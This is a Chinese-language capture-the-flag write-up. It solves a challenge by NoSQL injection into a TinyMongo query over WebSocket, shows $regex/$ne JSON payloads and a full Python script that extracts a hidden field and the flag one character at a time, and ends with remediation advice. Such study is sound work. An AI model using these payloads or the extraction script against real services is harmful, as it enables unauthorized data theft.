# chamber of secrets

## 题目简述

服务启动时向 TinyMongo 数据库插入一条记录，其中 `chamber` 是随机 12 字节的十六进制字符串，`secret` 是 flag。客户端通过 WebSocket 提交 JSON，服务端把其中两个值直接嵌入 Mongo 风格查询。

因为程序没有要求字段必须是字符串，攻击者可以把 `$regex`、`$ne` 等查询运算符作为 JSON 对象传入，形成 NoSQL 注入。接口只返回“匹配”或“不匹配”，但这一位布尔信息足以逐字符恢复两个字段。

## 解题过程

服务端查询为：

```python
creds = json.loads(data)
chamber = creds["chamber"]
secret = creds["secret"]

query = {"$and": [{"chamber": chamber, "secret": secret}]}
user = secrets.find_one(query)
```

正常输入会形成字符串相等查询；若发送：

```json
{
  "chamber": {"$regex": "^a.*"},
  "secret": {"$ne": 1}
}
```

TinyMongo 会把两个对象解释为运算符表达式。只要 chamber 以 `a` 开头且 secret 不等于数字 1，响应就是 `Looks like you know your secret!`。

`chamber` 固定为 24 个十六进制字符，可以逐位枚举；取得 chamber 后，再对 `secret` 做前缀匹配，遇到 `}` 即停止：

```python
import json
import re
import string
from websocket import create_connection

ws = create_connection("ws://127.0.0.1:8000/")
success = "Looks like you know your secret!"

def query(chamber, secret):
    ws.send(json.dumps({"chamber": chamber, "secret": secret}))
    return ws.recv() == success

chamber = ""
for _ in range(24):
    for char in "0123456789abcdef":
        candidate = chamber + char
        if query({"$regex": f"^{candidate}.*"}, {"$ne": 1}):
            chamber = candidate
            print("chamber:", chamber)
            break
    else:
        raise RuntimeError("chamber extraction failed")

alphabet = string.ascii_letters + string.digits + "_{}$"
secret = ""
while not secret.endswith("}"):
    for char in alphabet:
        candidate = secret + char
        pattern = f"^{re.escape(candidate)}.*"
        if query(chamber, {"$regex": pattern}):
            secret = candidate
            print("secret:", secret)
            break
    else:
        raise RuntimeError("secret extraction failed")

print(secret)
ws.close()
```

逐字符布尔盲注恢复出：

```text
shellmates{n05Ql_r35lLy_s0cK5_0c427d222ea2}
```

## 方法总结

NoSQL 接口并不天然免疫注入。当 JSON 值可以是对象时，攻击者提交的内容可能从“待比较的数据”变成“查询语法”。本题的 `$regex` 提供前缀 oracle，`$ne` 则用于让另一个未知字段恒真，从而把两个字段分阶段提取。

修复应先做严格模式验证，要求 `chamber` 和 `secret` 都是长度受限的普通字符串，再使用数据库层的字面值比较。错误响应和耗时也应尽量统一，避免把匹配结果变成可自动化的逐字符 oracle。
